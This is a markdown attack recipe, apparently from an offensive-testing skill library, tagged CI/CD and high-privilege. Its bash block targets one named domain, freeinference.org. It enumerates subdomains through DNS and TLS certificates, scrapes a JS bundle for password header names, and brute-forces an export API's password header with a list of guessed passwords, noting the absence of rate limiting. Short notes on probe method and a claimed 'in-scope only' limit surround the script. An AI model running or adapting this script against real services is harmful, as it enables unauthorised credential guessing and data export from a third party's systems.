# Reproduction Recipe — ci-cd / high-priv

- source canon: `holyshit-mode/recon-technique-multi-host-brute.md`
- base technique: `holyshit-mode-recon-technique-multi-host-brute-reproduction-.md`
- bindings: **WSTG-BUSL** · **CWE-200** · **ATT&CK T1005**
- context: **ci-cd** · auth **high-priv** · chain role **pivot**

## Context

- platform: pipeline config/runner surface — secrets and lateral movement ride the runners
- auth state: the baseline IS the privileged session; test downgrade paths (mass-assign, state-bypass)

## The technique

```bash
# 1. Discover hosts (DNS + TLS SAN)
echo -e "api\ndoc\ninternal\nstatus\nstaging" | while read s; do host $s.freeinference.org; done
openssl s_client -connect freeinference.org:443 -servername freeinference.org < /dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"

# 2. Mine JS bundle for password headers
curl -s https://doc.freeinference.org | grep -oP 'x-[a-z]+-password'

# 3. Brute-force (no rate limit → full speed)
for p in admin password freeinference openinfra madsys harvard seal; do
  curl -s -H "x-export-password: $p" "https://openinfra.freeinference.org/api/export?days=30" | head -c 100
done
```

## Probe adjustment (ci-cd × high-priv)

1. baseline first: the request/session with NOTHING changed
2. attack: the documented class probe, adjusted per context above
3. diff: measurable only — status/length/body — or it is not a finding

## Chain roles

- combines with a prior finding — chain detect pairs same-origin findings
- pairs-with: see `skilltree-index.md` for the sibling techniques

## Walls

- validation-only · NO-GAIN · documented-class adaptation only
- in-scope only: the scope authority refuses everything else (rc=1)
